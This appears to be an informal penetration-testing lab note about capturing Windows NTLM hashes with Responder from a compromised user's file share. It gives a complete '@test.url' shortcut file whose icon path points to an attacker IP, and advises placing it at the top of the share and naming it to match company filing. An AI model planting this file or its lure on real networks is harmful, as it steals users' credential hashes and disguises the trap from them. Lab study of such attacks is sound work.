We need to switch on the SMB and HTTP in order to run this attack successfully from the responder.conf file as we ha turned if off for the attack at the time of SMB relay attack.
 


If a user has been compromised and this user has any kind of sharing access we can utilize that access to capture more hashes via responder.

As there is some problem not able to open the Hydra-DC hack-me folder so i copied the code in the share folder of Punisher PC and la di da the attack worked.

Name the File : "@test.url"
@ put the file at the top of the file list
and name it accordign to company filing

```
[InternetShortcut]
URL=blah
WorkingDirectory=blah
IconFile=\\192.168.17.128\%USERNAME%.icon
IconIndex=1
```
